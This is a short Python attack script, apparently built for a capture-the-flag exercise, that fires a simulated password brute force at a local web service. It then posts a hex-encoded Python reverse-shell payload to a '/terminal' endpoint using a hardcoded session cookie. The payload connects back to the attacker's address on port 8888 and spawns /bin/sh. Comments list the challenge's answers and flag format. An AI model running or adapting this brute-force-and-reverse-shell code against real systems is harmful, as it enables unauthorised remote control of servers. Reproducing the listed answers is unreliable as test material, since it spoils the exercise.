from requests import post
from random import shuffle
from time import sleep
selfip = '192.168.253.1'
revport = 8888
target = 'http://172.21.228.16:9999/'

cookie = '7E24253C39078C42652BF9E5921901C2'
payload = f'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{selfip}",{revport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'.encode().hex()

wordlist = open("passwords",'r').read().split("\n")[:229]
wordlist.append('goblin')
shuffle(wordlist)

# goblin
# 7E24253C39078C42652BF9E5921901C2
# hexadecimal
# rogue
# hotimages.zip
# opensesame
# h0tp1cs!
# YCEP2023{sha1(alloftheabove)}

# imitate a bruteforce
for i in wordlist:
    print(post(target,json={'username':'admin','password':i}).text)
sleep(5)
post(target+'/terminal', json={'command':payload}, cookies={'token':cookie})